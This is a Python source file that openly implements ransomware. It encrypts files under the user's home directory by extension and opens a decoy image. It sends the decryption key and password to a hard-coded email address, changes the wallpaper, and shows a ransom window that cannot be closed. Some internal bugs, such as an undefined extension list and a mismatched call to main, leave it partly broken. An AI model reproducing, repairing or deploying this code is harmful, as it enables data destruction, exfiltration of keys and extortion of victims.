import platform
import sys
import os
import fnmatch
import time
from tkinter import *
from tkinter import messagebox
from functools import partial
from PIL import ImageTk, Image
from threading import Thread
import subprocess

import modules.cryptography
import modules.send_email
import modules.validate_input
import modules.handle_wallpaper
import modules.test_decryption_key
import modules.check_connection
from modules.normalize_path_name import normalize_path_name


class Ransomware:
    def __init__(self, starting_dir_test):
        # self.interesting_extensions = [
        #     'dwg', 'dxf', 'rtd', 'rft', 'rte', 'rvg', 'ies', 'rfa', 'rds'
        #                                                             'jpg', 'jpeg', 'bmp', 'gif', 'png', 'svg', 'psd',
        #     'raw',
        #     'mp3', 'mp4', 'm4a', 'aac', 'ogg', 'flac', 'wav', 'wma', 'aiff', 'ape',
        #     'avi', 'flv', 'm4v', 'mkv', 'mov', 'mpg', 'mpeg', 'wmv', 'swf', '3gp',
        #     'doc', 'docx', 'xls', 'xlsx', 'ppt', 'pptx',
        #     'odt', 'odp', 'ods', 'txt', 'rtf', 'tex', 'pdf', 'epub', 'md', 'mobi',
        #     'yml', 'yaml', 'json', 'xml', 'csv',
        #     'db', 'sql', 'dbf', 'mdb', 'iso',
        #     'html', 'htm', 'xhtml', 'php', 'asp', 'aspx', 'js', 'jsp', 'css',
        #     'c', 'cpp', 'cxx', 'h', 'hpp', 'hxx',
        #     'java', 'class', 'jar',
        #     'ps', 'bat', 'vb',
        #     'awk', 'sh', 'cgi', 'pl', 'ada', 'swift',
        #     'go', 'py', 'pyc', 'bf', 'coffee',
        #     'zip', 'tar', 'tgz', 'bz2', '7z', 'rar', 'bak',
        # ]

        self.interesting_extensions_tests = ['txt']
        self.starting_dir_test = starting_dir_test

    def main(self):
        # start = time.time()

        self.open_fake_file()

        generate_key = self.handle_key()

        self.encrypt_files(generate_key['key'])

        t = Thread(target=partial(self.handle_mail, generate_key, passwd))
        t.daemon = True

        t.start()

        # stop = time.time()
        # print('Encryption made in {}'.format(round(stop - start, 3)))

        modules.handle_wallpaper.change_wallpaper()

        gui = RansomGUI(os.path.expanduser('~'), generate_key)
        gui.show_message()


    def gen_pass(self):
        new_password = modules.cryptography.generate_password()
        return new_password


    def handle_key(self):
        key = modules.cryptography.generate_key(passwd)
        bin_key = ''

        for c in key:
            bin_key += str(c) + '.'

        return {
                "key": key,
                "bin_key": bin_key[:-1]
                }

    def handle_mail(self, key, passwd):

        main_dir = os.path.expanduser('~')
        is_connection = modules.check_connection.check_connection()
        bin_key = key['bin_key']

        self.create_copy_of_key(key, main_dir)

        while not is_connection:
            time.sleep(10)

            is_connection = modules.check_connection.check_connection()

        try:
            message_body = "OS: {}\nKey_dec: {}\nPassword: {}\nHashing_algorithm(password): SHA256\nEncryption_algorithm: AES".format(platform.system(), bin_key, passwd)
            modules.send_email.send_mail('transfered.data@gmail.com', '__47ck3r__', message_body, 'Ransomware report')

            self.remove_copy_of_key(main_dir)
        except:
            self.handle_mail(key, passwd)


    def create_copy_of_key(self, key, dir_to):
        dir_to = sys._MEIPASS

        path = normalize_path_name(dir_to, 'sys_config.txt')

        with open(path, 'a+') as new_file:
            new_file.write(key['bin_key'])

        # Save key in plain text (in production file will be encrypted)

        # modules.cryptography.encrypt(key['key'], path)

    def remove_copy_of_key(self, dir):
        path = normalize_path_name(dir, 'sys_config.txt')
        os.remove(path)

    def encrypt_files(self, key):
        all_files = self.file_generator(self.starting_dir_test, self.interesting_extensions)

        for f in all_files:
            try:
                modules.cryptography.encrypt(key, f)
            except:
                pass

    def file_generator(self, path, extensions):
        for root, dirs, files in os.walk(path):
            for name in files:
                if name.split('.')[-1] in extensions:
                    yield os.path.join(root, name)

    def open_fake_file(self):
        subprocess.Popen(normalize_path_name(sys._MEIPASS, 'kali.jpg'), shell=True)


class RansomGUI(Ransomware):

    def __init__(self, starting_dir_test, key_input):
        self.extensions_to_decrypt = ['encrypted']
        self.key_input = key_input

        Ransomware.__init__(self, starting_dir_test)


    def show_message(self):
        root = Tk()
        root.title("RANSOMWARE")

        # header
        new_label = Label(root, text='Attention!', width=200)
        new_label.config(font=("Arial", 44))
        new_label.pack()

        # top message
        new_label = Label(root,
                          text='You\'ve been hacked! From now on, all valuable files on your hard drive are encrypted.\n Wanna your files back? I know you do, but you have to pay first!\n Closing this window is disabled for your own good (if you\'d close this, how would you decrypt your files?)')
        new_label.pack()

        # image

        img = ImageTk.PhotoImage(Image.open(normalize_path_name(sys._MEIPASS, 'frog.jpg')))
        img_label = Label(root, image=img)
        img_label.pack()

        # enter key message
        new_label = Label(root,
                          text='Enter key here (one note: if you consider brute-force attack against encryption, belive me, it\'s a waste of time)')
        new_label.pack()

        # input field
        e = Entry(root)
        e.pack()

        # button
        button = Button(root, text='Decrypt my files!', command=partial(self.trigger_decrypt, e.get))

        button.pack()

        # display on top
        root.attributes('-topmost', True)
        root.update()
        root.attributes('-topmost', False)

        root.protocol("WM_DELETE_WINDOW", self.disable_event)

        root.mainloop()

    def throw_error_message(self):
        messagebox.showerror('ERROR', 'Wrong key man!\n If you are trying to brute-force encryption, then good luck xd\n If not, please enter valid key more carefully')


    def trigger_decrypt(self, text_message_callback):
        possible_key = text_message_callback().strip()

        modules.validate_input.validate_length(possible_key)

        is_key_ok = modules.test_decryption_key.test_decryption_key(self.key_input, possible_key)

        if is_key_ok:

            all_files = self.file_generator(
                self.starting_dir_test,
                self.extensions_to_decrypt
            )

            for f in all_files:
                try:
                    modules.cryptography.decrypt(possible_key, f)
                except StopIteration:
                    pass

            sys.exit(0)

        else:
            self.throw_error_message()

    def disable_event(self):
        pass


ransom = Ransomware(os.path.expanduser('~'))
passwd = ransom.gen_pass()
ransom.main(passwd)


if __name__ == '__main__':
    pass


